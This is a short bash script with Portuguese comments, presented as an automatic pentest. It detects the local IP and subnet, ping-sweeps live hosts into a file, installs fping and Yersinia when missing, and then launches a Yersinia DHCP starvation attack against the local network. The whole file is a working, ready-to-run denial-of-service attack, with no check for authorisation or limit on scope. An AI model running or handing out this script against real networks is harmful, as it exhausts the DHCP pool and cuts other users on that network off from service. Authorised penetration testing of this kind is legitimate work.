#!/bin/bash

# Exibe uma mensagem de início do pentest com destaque em amarelo
echo -e "\e[1;33m[*] Iniciando Pentest Automático de DHCP Starvation com Yersinia...\e[0m"

# --------- Detectar IP Local ---------
# Captura o IP local da máquina (o primeiro da lista de IPs atribuídos)
IP=$(hostname -I | awk '{print $1}')
echo -e "\e[1;34m[>] IP Local: $IP\e[0m"

# --------- Detectar Sub-rede ---------
# Obtém a sub-rede (ex: 192.168.1.0/24) a partir da tabela de roteamento
SUBNET=$(ip route | grep 'src' | grep -oP '\d+\.\d+\.\d+\.\d+/\d+')
echo -e "\e[1;34m[>] Sub-rede: $SUBNET\e[0m"

# --------- Ping Sweep ---------
echo -e "\e[1;34m[>] Varredura de hosts ativos na rede...\e[0m"

# Verifica se o utilitário 'fping' está instalado; se não estiver, instala automaticamente
if ! command -v fping &> /dev/null
then
    echo -e "\e[1;31m[!] fping não encontrado. Instalando...\e[0m"
    sudo apt update && sudo apt install fping -y
fi

# Realiza uma varredura de todos os IPs da sub-rede e salva apenas os hosts que responderem (ativos)
LIVE_HOSTS=$(fping -a -g $SUBNET 2>/dev/null)
echo "$LIVE_HOSTS" > hosts_ativos.txt
echo -e "\e[1;32m[+] Hosts ativos salvos em hosts_ativos.txt\e[0m"

# --------- Verificar Yersinia ---------
# Verifica se o Yersinia está instalado; se não estiver, instala automaticamente
if ! command -v yersinia &> /dev/null
then
    echo -e "\e[1;31m[!] Yersinia não instalado. Instalando...\e[0m"
    sudo apt update && sudo apt install yersinia -y
else
    echo -e "\e[1;32m[+] Yersinia já instalado.\e[0m"
fi

# --------- Iniciar Ataque DHCP Starvation ---------
# Executa o ataque DHCP Starvation usando o Yersinia em modo CLI (modo 1 do ataque)
echo -e "\e[1;31m[!!] Iniciando DHCP Starvation Attack com Yersinia...\e[0m"
sudo yersinia dhcp -attack 1

# Mensagem final informando que o ataque foi executado
echo -e "\e[1;33m[*] Ataque executado. Monitore o funcionamento da rede.\e[0m"


